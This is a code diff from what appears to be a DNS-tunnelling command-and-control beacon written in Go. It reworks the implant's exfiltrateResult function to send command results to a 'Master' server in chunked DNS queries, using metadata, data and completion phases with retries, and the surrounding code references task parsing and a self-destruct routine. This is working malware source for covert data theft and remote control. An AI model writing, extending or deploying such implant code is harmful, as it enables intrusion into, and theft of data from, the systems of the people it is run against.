@@ -238,7 +238,11 @@ func (b *Beacon) selfDestruct() string {
 	return "Self-destruct initiated. Beacon will terminate and remove itself in 3 seconds."
 }
 
-// exfiltrateResult sends command results back via DNS using two-phase protocol with burst-based jitter
+// exfiltrateResult sends command results back via DNS using three-phase protocol:
+// 1. RESULT_META - announces incoming result with total size and chunk count
+// 2. DATA chunks - sends result data in manageable pieces
+// 3. RESULT_COMPLETE - signals all chunks sent successfully
+// This ensures Master never marks tasks complete until beacon confirms completion
 func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	maxCmd := b.client.config.MaxCommandLength
 	if maxCmd <= 64 {
@@ -255,15 +259,12 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 		safeRawChunk = 50 // conservative max to avoid DNS issues
 	}
 
-	if len(result) <= safeRawChunk {
-		// Send in single RESULT message
-		exfilData := fmt.Sprintf("RESULT|%s|%s|%s", b.id, taskID, result)
-		_, err := b.client.sendCommand(exfilData)
-		return err
-	}
-
+	// ALWAYS use chunked protocol (even for small results) to avoid ambiguity
 	// Phase 1: Send metadata about the incoming chunked result with retries
 	totalChunks := (len(result) + safeRawChunk - 1) / safeRawChunk
+	if totalChunks == 0 {
+		totalChunks = 1 // Empty result still needs 1 chunk
+	}
 
 	metaData := fmt.Sprintf("RESULT_META|%s|%s|%d|%d", b.id, taskID, len(result), totalChunks)
 
@@ -353,7 +354,19 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 		return fmt.Errorf("failed to send %d/%d chunks", failedChunks, totalChunks)
 	}
 
-	return nil
+	// Phase 3: Send completion message to signal all chunks sent successfully
+	completeData := fmt.Sprintf("RESULT_COMPLETE|%s|%s|%d", b.id, taskID, totalChunks)
+	for attempt := 1; attempt <= 3; attempt++ {
+		_, err = b.client.sendCommand(completeData)
+		if err == nil {
+			return nil // Success
+		}
+		if attempt < 3 {
+			time.Sleep(time.Duration(attempt) * time.Second)
+		}
+	}
+
+	return fmt.Errorf("failed to send completion message after 3 attempts: %v", err)
 }
 
 // parseTask parses a task from the DNS server response
